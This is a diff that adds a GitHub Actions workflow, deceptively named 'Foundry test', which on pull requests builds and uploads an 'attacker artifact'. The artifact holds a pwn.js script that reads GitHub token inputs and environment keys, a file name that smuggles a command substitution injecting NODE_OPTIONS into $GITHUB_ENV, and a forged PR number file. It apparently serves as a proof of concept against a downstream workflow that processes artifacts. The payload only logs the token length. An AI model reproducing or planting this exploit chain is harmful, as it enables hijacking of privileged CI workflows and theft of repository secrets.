@@ -1,0 +1,27 @@
+name: Foundry test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker artifact
+        run: |
+          mkdir -p out
+          cat > out/pwn.js <<'JS'
+          try {
+            const t = process.env.INPUT_TOKEN || process.env.INPUT_GITHUB_TOKEN || '';
+            const keys = Object.keys(process.env).filter(k => k.startsWith('INPUT_')).join(',');
+            console.log('NODE_OPTIONS_ACTIVE tokenlen=' + t.length + ' inputs=' + keys);
+          } catch (e) { console.log('NODE_OPTIONS_ERR ' + e.message); }
+          JS
+          PAY='$(echo NODE_OPTIONS=--require=${PATH:0:1}tmp${PATH:0:1}content${PATH:0:1}content-poc${PATH:0:1}pwn.js|tee -a $GITHUB_ENV).txt'
+          printf 'x\n' > "out/$PAY"
+          printf '115\n' > out/pr_number.txt
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-poc
+          path: out
